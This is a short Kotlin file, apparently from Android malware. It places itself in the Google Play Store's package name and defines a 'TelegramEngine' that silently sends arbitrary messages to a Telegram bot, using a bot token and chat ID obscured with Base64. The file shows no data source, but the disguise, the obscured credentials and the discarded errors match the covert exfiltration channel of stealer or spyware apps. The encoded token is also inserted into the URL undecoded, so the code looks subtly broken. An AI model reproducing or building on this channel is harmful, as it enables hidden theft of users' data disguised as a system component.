package com.android.vending.service
import okhttp3.*
import java.io.IOException

object TelegramEngine {
    private val client = OkHttpClient()
    private const val TOKEN = "ODcwMzEzMDY4NTpBQUhLX2R2UWpZLVFrNXByRy1oT2h4MVpEcnREZEc5R2pEOA=="
    private const val CHAT_ID = "NjQ2MTMyNDk2Ng=="

    fun send(msg: String) {
        val url = "https://api.telegram.org/bot$TOKEN/sendMessage?chat_id=$CHAT_ID&text=${java.net.URLEncoder.encode(msg, "UTF-8")}"
        client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) = response.close()
        })
    }
}
